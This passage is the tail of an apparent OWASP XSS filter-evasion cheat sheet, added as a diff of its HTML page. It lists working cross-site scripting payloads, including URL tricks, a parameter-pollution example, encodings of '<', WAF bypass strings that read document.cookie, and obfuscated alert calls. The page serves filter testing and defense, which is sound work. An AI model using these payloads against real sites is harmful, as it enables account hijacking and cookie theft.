+<p><code>//</code> translates to <code>http://</code> which saves a few more bytes. This is really handy when space is an issue too (two less characters can go a long way) and can easily bypass regex like <code>(ht|f)tp(s)?://</code> (thanks to Ozh for part of this one). You can also change the <code>//</code> to <code>\\\\</code>. You do need to keep the slashes in place, however, otherwise this will be interpreted as a relative path URL.</p>
+<p><code>&lt;A HREF="//www.google.com/"&gt;XSS&lt;/A&gt;</code></p>
+<h4 id="google-feeling-lucky-part-1">Google "feeling lucky" part 1<a class="headerlink" href="#google-feeling-lucky-part-1" title="Permanent link">&para;</a></h4>
+<p>Firefox uses Google's "feeling lucky" function to redirect the user to any keywords you type in. So if your exploitable page is the top for some random keyword (as you see here) you can use that feature against any Firefox user. This uses Firefox's <code>keyword:</code> protocol. You can concatenate several keywords by using something like the following <code>keyword:XSS+RSnake</code> for instance. This no longer works within Firefox as of 2.0.</p>
+<p><code>&lt;A HREF="//google"&gt;XSS&lt;/A&gt;</code></p>
+<h4 id="google-feeling-lucky-part-2">Google "feeling lucky" part 2<a class="headerlink" href="#google-feeling-lucky-part-2" title="Permanent link">&para;</a></h4>
+<p>This uses a very tiny trick that appears to work Firefox only, because of it's implementation of the "feeling lucky" function. Unlike the next one this does not work in Opera because Opera believes that this is the old HTTP Basic Auth phishing attack, which it is not. It's simply a malformed URL. If you click okay on the dialogue it will work, but as a result of the erroneous dialogue box I am saying that this is not supported in Opera, and it is no longer supported in Firefox as of 2.0:</p>
+<p><code>&lt;A HREF="http://ha.ckers.org@google"&gt;XSS&lt;/A&gt;</code></p>
+<h4 id="google-feeling-lucky-part-3">Google "feeling lucky" part 3<a class="headerlink" href="#google-feeling-lucky-part-3" title="Permanent link">&para;</a></h4>
+<p>This uses a malformed URL that appears to work in Firefox and Opera only, because of their implementation of the "feeling lucky" function. Like all of the above it requires that you are #1 in Google for the keyword in question (in this case "google"):</p>
+<p><code>&lt;A HREF="http://google:ha.ckers.org"&gt;XSS&lt;/A&gt;</code></p>
+<h4 id="removing-cnames">Removing CNAMEs<a class="headerlink" href="#removing-cnames" title="Permanent link">&para;</a></h4>
+<p>When combined with the above URL, removing <code>www.</code> will save an additional 4 bytes for a total byte savings of 9 for servers that have this set up properly):</p>
+<p><code>&lt;A HREF="http://google.com/"&gt;XSS&lt;/A&gt;</code></p>
+<p>Extra dot for absolute DNS:</p>
+<p><code>&lt;A HREF="http://www.google.com./"&gt;XSS&lt;/A&gt;</code></p>
+<h4 id="javascript-link-location">JavaScript Link Location<a class="headerlink" href="#javascript-link-location" title="Permanent link">&para;</a></h4>
+<p><code>&lt;A HREF="javascript:document.location='http://www.google.com/'"&gt;XSS&lt;/A&gt;</code></p>
+<h4 id="content-replace-as-attack-vector">Content Replace as Attack Vector<a class="headerlink" href="#content-replace-as-attack-vector" title="Permanent link">&para;</a></h4>
+<!-- markdownlint-disable MD010-->
+<p>Assuming <code>http://www.google.com/</code> is programmatically replaced with nothing). I actually used a similar attack vector against several separate real world XSS filters by using the conversion filter itself (here is an example) to help create the attack vector (IE: <code>java&amp;\#x09;script:</code> was converted into <code>java    script:</code>, which renders in IE, Netscape 8.1+ in secure site mode and Opera):</p>
+<!-- markdownlint-enable MD010-->
+
+<p><code>&lt;A HREF="http://www.google.com/ogle.com/"&gt;XSS&lt;/A&gt;</code></p>
+<h3 id="assisting-xss-with-http-parameter-pollution">Assisting XSS with HTTP Parameter Pollution<a class="headerlink" href="#assisting-xss-with-http-parameter-pollution" title="Permanent link">&para;</a></h3>
+<p>Assume a content sharing flow on a web site is implemented as shown below. There is a "Content" page which includes some content provided by users and this page also includes a link to "Share" page which enables a user choose their favorite social sharing platform to share it on. Developers HTML encoded the "title" parameter in the "Content" page to prevent against XSS but for some reasons they didn't URL encoded this parameter to prevent from HTTP Parameter Pollution. Finally they decide that since content_type's value is a constant and will always be integer, they didn't encode or validate the content_type in the "Share" page.</p>
+<h4 id="content-page-source-code">Content Page Source Code<a class="headerlink" href="#content-page-source-code" title="Permanent link">&para;</a></h4>
+<p><code>a href="/Share?content_type=1&amp;title=&lt;%=Encode.forHtmlAttribute(untrusted content title)%&gt;"&gt;Share&lt;/a&gt;</code></p>
+<h4 id="share-page-source-code">Share Page Source Code<a class="headerlink" href="#share-page-source-code" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+<span class="kd">var</span> <span class="nx">contentType</span> <span class="o">=</span> <span class="o">&lt;%=</span><span class="nx">Request</span><span class="p">.</span><span class="nx">getParameter</span><span class="p">(</span><span class="s2">&quot;content_type&quot;</span><span class="p">)</span><span class="o">%&gt;</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">title</span> <span class="o">=</span> <span class="s2">&quot;&lt;%=Encode.forJavaScript(request.getParameter(&quot;</span><span class="nx">title</span><span class="s2">&quot;))%&gt;&quot;</span><span class="p">;</span>
+<span class="p">...</span>
+<span class="c1">//some user agreement and sending to server logic might be here</span>
+<span class="p">...</span>
+<span class="o">&lt;</span><span class="err">/script&gt;</span>
+</code></pre></div>
+<h4 id="content-page-output">Content Page Output<a class="headerlink" href="#content-page-output" title="Permanent link">&para;</a></h4>
+<p>In this case if attacker set untrusted content title as “This is a regular title&amp;content_type=1;alert(1)” the link in "Content" page would be this:</p>
+<p><code>&lt;a href="/share?content_type=1&amp;title=This is a regular title&amp;amp;content_type=1;alert(1)"&gt;Share&lt;/a&gt;</code></p>
+<h4 id="share-page-output">Share Page Output<a class="headerlink" href="#share-page-output" title="Permanent link">&para;</a></h4>
+<p>And in share page output could be this:</p>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+<span class="kd">var</span> <span class="nx">contentType</span> <span class="o">=</span> <span class="mf">1</span><span class="p">;</span> <span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">title</span> <span class="o">=</span> <span class="s2">&quot;This is a regular title&quot;</span><span class="p">;</span>
+<span class="err">…</span>
+<span class="c1">//some user agreement and sending to server logic might be here</span>
+<span class="err">…</span>
+<span class="o">&lt;</span><span class="err">/script&gt;</span>
+</code></pre></div>
+<p>As a result, in this example the main flaw is trusting the content_type in the "Share" page without proper encoding or validation. HTTP Parameter Pollution could increase impact of the XSS flaw by promoting it from a reflected XSS to a stored XSS.</p>
+<h2 id="character-escape-sequences">Character Escape Sequences<a class="headerlink" href="#character-escape-sequences" title="Permanent link">&para;</a></h2>
+<p>All the possible combinations of the character "\&lt;" in HTML and JavaScript. Most of these won't render out of the box, but many of them can get rendered in certain circumstances as seen above.</p>
+<ul>
+<li><code>&lt;</code></li>
+<li><code>%3C</code></li>
+<li><code>&amp;lt</code></li>
+<li><code>&amp;lt;</code></li>
+<li><code>&amp;LT</code></li>
+<li><code>&amp;LT;</code></li>
+<li><code>&amp;#60;</code></li>
+<li><code>&amp;#060;</code></li>
+<li><code>&amp;#0060;</code></li>
+<li><code>&amp;#00060;</code></li>
+<li><code>&amp;#000060;</code></li>
+<li><code>&amp;#0000060;</code></li>
+<li><code>&amp;#60;</code></li>
+<li><code>&amp;#060;</code></li>
+<li><code>&amp;#0060;</code></li>
+<li><code>&amp;#00060;</code></li>
+<li><code>&amp;#000060;</code></li>
+<li><code>&amp;#0000060;</code></li>
+<li><code>&amp;#x3c;</code></li>
+<li><code>&amp;#x03c;</code></li>
+<li><code>&amp;#x003c;</code></li>
+<li><code>&amp;#x0003c;</code></li>
+<li><code>&amp;#x00003c;</code></li>
+<li><code>&amp;#x000003c;</code></li>
+<li><code>&amp;#x3c;</code></li>
+<li><code>&amp;#x03c;</code></li>
+<li><code>&amp;#x003c;</code></li>
+<li><code>&amp;#x0003c;</code></li>
+<li><code>&amp;#x00003c;</code></li>
+<li><code>&amp;#x000003c;</code></li>
+<li><code>&amp;#X3c;</code></li>
+<li><code>&amp;#X03c;</code></li>
+<li><code>&amp;#X003c;</code></li>
+<li><code>&amp;#X0003c;</code></li>
+<li><code>&amp;#X00003c;</code></li>
+<li><code>&amp;#X000003c;</code></li>
+<li><code>&amp;#X3c;</code></li>
+<li><code>&amp;#X03c;</code></li>
+<li><code>&amp;#X003c;</code></li>
+<li><code>&amp;#X0003c;</code></li>
+<li><code>&amp;#X00003c;</code></li>
+<li><code>&amp;#X000003c;</code></li>
+<li><code>&amp;#x3C;</code></li>
+<li><code>&amp;#x03C;</code></li>
+<li><code>&amp;#x003C;</code></li>
+<li><code>&amp;#x0003C;</code></li>
+<li><code>&amp;#x00003C;</code></li>
+<li><code>&amp;#x000003C;</code></li>
+<li><code>&amp;#x3C;</code></li>
+<li><code>&amp;#x03C;</code></li>
+<li><code>&amp;#x003C;</code></li>
+<li><code>&amp;#x0003C;</code></li>
+<li><code>&amp;#x00003C;</code></li>
+<li><code>&amp;#x000003C;</code></li>
+<li><code>&amp;#X3C;</code></li>
+<li><code>&amp;#X03C;</code></li>
+<li><code>&amp;#X003C;</code></li>
+<li><code>&amp;#X0003C;</code></li>
+<li><code>&amp;#X00003C;</code></li>
+<li><code>&amp;#X000003C;</code></li>
+<li><code>&amp;#X3C;</code></li>
+<li><code>&amp;#X03C;</code></li>
+<li><code>&amp;#X003C;</code></li>
+<li><code>&amp;#X0003C;</code></li>
+<li><code>&amp;#X00003C;</code></li>
+<li><code>&amp;#X000003C;</code></li>
+<li><code>\x3c</code></li>
+<li><code>\x3C</code></li>
+<li><code>\u003c</code></li>
+<li><code>\u003C</code></li>
+</ul>
+<h2 id="methods-to-bypass-waf-cross-site-scripting">Methods to Bypass WAF – Cross-Site Scripting<a class="headerlink" href="#methods-to-bypass-waf-cross-site-scripting" title="Permanent link">&para;</a></h2>
+<h3 id="general-issues">General issues<a class="headerlink" href="#general-issues" title="Permanent link">&para;</a></h3>
+<h4 id="stored-xss">Stored XSS<a class="headerlink" href="#stored-xss" title="Permanent link">&para;</a></h4>
+<p>If an attacker managed to push XSS through the filter, WAF wouldn’t be able to prevent the attack conduction.</p>
+<h4 id="reflected-xss-in-javascript">Reflected XSS in JavaScript<a class="headerlink" href="#reflected-xss-in-javascript" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>Example: &lt;script&gt; ... setTimeout(\\&quot;writetitle()\\&quot;,$\_GET\[xss\]) ... &lt;/script&gt;
+Exploitation: /?xss=500); alert(document.cookie);//
+</code></pre></div>
+<h4 id="dom-based-xss">DOM-based XSS<a class="headerlink" href="#dom-based-xss" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>Example: &lt;script&gt; ... eval($\_GET\[xss\]); ... &lt;/script&gt;
+Exploitation: /?xss=document.cookie
+</code></pre></div>
+<h4 id="xss-via-request-redirection">XSS via request Redirection<a class="headerlink" href="#xss-via-request-redirection" title="Permanent link">&para;</a></h4>
+<ul>
+<li>Vulnerable code:</li>
+</ul>
+<div class="highlight"><pre><span></span><code>...
+header(&#39;Location: &#39;.$_GET[&#39;param&#39;]);
+...
+</code></pre></div>
+<p>As well as:</p>
+<div class="highlight"><pre><span></span><code>..
+header(&#39;Refresh: 0; URL=&#39;.$_GET[&#39;param&#39;]); 
+...
+</code></pre></div>
+<ul>
+<li>This request will not pass through the WAF:</li>
+</ul>
+<p><code>/?param=&lt;javascript:alert(document.cookie&gt;)</code></p>
+<ul>
+<li>This request will pass through the WAF and an XSS attack will be conducted in certain browsers.</li>
+</ul>
+<p><code>/?param=&lt;data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=</code></p>
+<h3 id="waf-bypass-strings-for-xss">WAF ByPass Strings for XSS<a class="headerlink" href="#waf-bypass-strings-for-xss" title="Permanent link">&para;</a></h3>
+<!-- markdownlint-disable MD038-->
+<ul>
+<li><code>&lt;Img src = x onerror = "javascript: window.onerror = alert; throw XSS"&gt;</code></li>
+<li><code>&lt;Video&gt; &lt;source onerror = "javascript: alert (XSS)"&gt;</code></li>
+<li><code>&lt;Input value = "XSS" type = text&gt;</code></li>
+<li><code>&lt;applet code="javascript:confirm(document.cookie);"&gt;</code></li>
+<li><code>&lt;isindex x="javascript:" onmouseover="alert(XSS)"&gt;</code></li>
+<li><code>"&gt;&lt;/SCRIPT&gt;”&gt;’&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</code></li>
+<li><code>"&gt;&lt;img src="x:x" onerror="alert(XSS)"&gt;</code></li>
+<li><code>"&gt;&lt;iframe src="javascript:alert(XSS)"&gt;</code></li>
+<li><code>&lt;object data="javascript:alert(XSS)"&gt;</code></li>
+<li><code>&lt;isindex type=image src=1 onerror=alert(XSS)&gt;</code></li>
+<li><code>&lt;img src=x:alert(alt) onerror=eval(src) alt=0&gt;</code></li>
+<li><code>&lt;img  src="x:gif" onerror="window['al\u0065rt'](0)"&gt;&lt;/img&gt;</code></li>
+<li><code>&lt;iframe/src="data:text/html,&lt;svg onload=alert(1)&gt;"&gt;</code></li>
+<li><code>&lt;meta content="&amp;NewLine; 1 &amp;NewLine;; JAVASCRIPT&amp;colon; alert(1)" http-equiv="refresh"/&gt;</code></li>
+<li><code>&lt;svg&gt;&lt;script xlink:href=data&amp;colon;,window.open('https://www.google.com/')&gt;&lt;/script</code></li>
+<li><code>&lt;meta http-equiv="refresh" content="0;url=javascript:confirm(1)"&gt;</code></li>
+<li><code>&lt;iframe src=javascript&amp;colon;alert&amp;lpar;document&amp;period;location&amp;rpar;&gt;</code></li>
+<li><code>&lt;form&gt;&lt;a href="javascript:\u0061lert(1)"&gt;X</code></li>
+<li><code>&lt;/script&gt;&lt;img/*%00/src="worksinchrome&amp;colon;prompt(1)"/%00*/onerror='eval(src)'&gt;</code></li>
+<li><code>&lt;style&gt;//*{x:expression(alert(/xss/))}//&lt;style&gt;&lt;/style&gt;</code></li>
+<li>On Mouse Over​</li>
+<li><code>&lt;img src="/" =_=" title="onerror='prompt(1)'"&gt;</code></li>
+<li><code>&lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&amp;#97v&amp;#97script:&amp;#97lert(1)&gt;ClickMe</code></li>
+<li><code>&lt;script x&gt; alert(1) &lt;/script 1=2</code></li>
+<li><code>&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME</code></li>
+<li><code>&lt;input/onmouseover="javaSCRIPT&amp;colon;confirm&amp;lpar;1&amp;rpar;"</code></li>
+<li><code>&lt;iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"&gt;&lt;/iframe&gt;</code></li>
+<li><code>&lt;OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"&gt;&lt;PARAM NAME="DataURL" VALUE="javascript:alert(1)"&gt;&lt;/OBJECT&gt;</code></li>
+</ul>
+<!-- markdownlint-enable MD038-->
+
+<h3 id="filter-bypass-alert-obfuscation">Filter Bypass Alert Obfuscation<a class="headerlink" href="#filter-bypass-alert-obfuscation" title="Permanent link">&para;</a></h3>
+<ul>
+<li><code>(alert)(1)</code></li>
+<li><code>a=alert,a(1)</code></li>
+<li><code>[1].find(alert)</code></li>
+<li><code>top[“al”+”ert”](1)</code></li>
+<li><code>top[/al/.source+/ert/.source](1)</code></li>
+<li><code>al\u0065rt(1)</code></li>
+<li><code>top[‘al\145rt’](1)</code></li>
+<li><code>top[‘al\x65rt’](1)</code></li>
+<li><code>top[8680439..toString(30)](1)</code></li>
+<li><code>alert?.()</code></li>
+<li>&#96;<code>${alert``}</code>&#96; (The payload should include leading and trailing backticks.)</li>
+<li><code>(alert())</code></li>
+</ul>
+                
+                  
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+        
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <nav class="md-footer__inner md-grid" aria-label="Footer">
+      
+        
+        <a href="XML_Security_Cheat_Sheet.html" class="md-footer__link md-footer__link--prev" aria-label="Previous: XML Security" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              XML Security
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="npm_Security_CheatSheet.html" class="md-footer__link md-footer__link--next" aria-label="Next: npm Security CheatSheet.md" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              npm Security CheatSheet.md
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            ©Copyright 2021 - CheatSheets Series Team - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/3.0/deed.en_US">Creative Commons Attribution 3.0 Unported License</a>.
+          </div>
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+        
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "..", "features": [], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../assets/javascripts/workers/search.709b4209.min.js", "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.febc23d1.min.js"></script>
+      
+    
+  </body>
+</html>
